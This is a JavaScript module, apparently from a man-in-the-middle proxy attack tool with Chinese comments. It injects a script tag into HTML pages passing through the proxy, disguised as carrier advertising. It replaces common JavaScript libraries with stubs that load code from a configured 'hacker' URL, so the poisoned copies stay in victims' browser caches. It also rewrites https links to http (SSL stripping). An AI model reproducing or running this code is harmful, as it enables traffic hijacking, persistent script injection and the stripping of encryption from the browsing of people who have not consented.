'use strict';

var config = require('./config.json'),
	fs = require('fs'),
	iconv = require('iconv-lite'),
	proxyWeb = require('./proxy_web.js');



function Read(path) {
	try {
		return fs.readFileSync(path) + '';
	}
	catch(e) {}
}




// ------------------------------
// 常用脚本库感染
// ------------------------------
var jslib_list = require('./asset/commlib/list.json');
var jslib_map = {};
var INJECT_JS;


//
// INJECT_FILE 就是注入到html文件里的<script src="..."> 外链的内容。
//   这个脚本的主要功能：让浏览器预加载感染过的常用脚本库，并缓存。
//
//   当然实际不用这个文件名，而是伪装成其他的url，例如运营商的广告^_^
//   具体INJECT_URL值可以在config.json里配置
//
var INJECT_FILE = './asset/inject/extern.js';
var INJECT_URL = config['inject_url'].replace('http://', '');


fs.watch(INJECT_FILE, function() {
	// 实时修改生效
	updateInjectJs();
});

function updateInjectJs() {
	INJECT_JS = Read(INJECT_FILE);
	if (!INJECT_JS) {
		return;
	}

	//
	// 填充常用脚本列表
	//
	INJECT_JS = INJECT_JS.replace('$LIST', jslib_list.join('|'));

	//
	// 调试状态下不压缩脚本
	//
	if (!config.debug) {
		INJECT_JS = require('uglify-js')
			.minify(INJECT_JS, {fromString: true}).code;
	}
}


// 载入常用脚本库url
function parseList() {
	jslib_list.forEach(function(url) {
		jslib_map[url] = true;
	});

	updateInjectJs();
}



exports.init = function() {
	parseList();
}

//
// 返回给用户的常用脚本库内容。
//   该请求由inject.js预加载发起，
//   所以我们并不返回真正的原始脚本文件，而是两个加载器而已。
//
// - 加载hacker代码
// - 加载原始脚本内容（在未来用户浏览时加载，让页面正常运行）
//
var stubCode = Read('asset/commlib/stub.js')
	.replace('$URL_HACKER', config['hacker_url']);


exports.injectJs = function(url) {
	// 注入页面的外链脚本
	if (url == INJECT_URL) {
		return INJECT_JS;
	}

	// 常用脚本库
	if (url in jslib_map) {
		return stubCode.replace('$URL_RAW', url);
	}
}




// ------------------------------
// 注入html文件的代码
// ------------------------------
var injectCode =
	'<script src="http://' + INJECT_URL + '"></script>';

exports.injectHtml = function(data, charset) {
	//
	// 优先使用<meta>标签里的charset标记：
	//   <meta charset="utf-8" />
	//   <META HTTP-EQUIV="Content-Type" CONTENT="text/html; CHARSET=GBK">
	//
	var str = data.toString();

	// 不是html文件
	if (! /<html|<body|<script|<img/i.test(str)) {
		return data;
	}

	var val = str.match(/<meta\s+[^>]*charset=['"]?([\w\-]*)/i);

	if (val && val[1]) {
		charset = val[1];
	}

	//
	// 将html二进制数据转为utf-8字符，方便字符串操作
	//
	charset = charset ? charset.toLowerCase() : 'utf-8';

	var html = (charset == 'utf-8')
				? str
				: iconv.decode(data, charset);

	//
	// 在<head>标签或结尾注入
	//
	html = html.replace(/<head>|$/i, '$&' + injectCode);

	//
	// 替换页面中的https链接为http，并做记录
	//
	html = html.replace(/https:\/\/([\w\-./?%&=+,]{4,})/g, function(str, url) {
		proxyWeb.addHttpsUrl(url);
		return 'http://' + url;
	});

	//
	// 转回二进制数据
	//
	return (charset == 'utf-8')
		? new Buffer(html)
		: iconv.encode(html, charset);
}
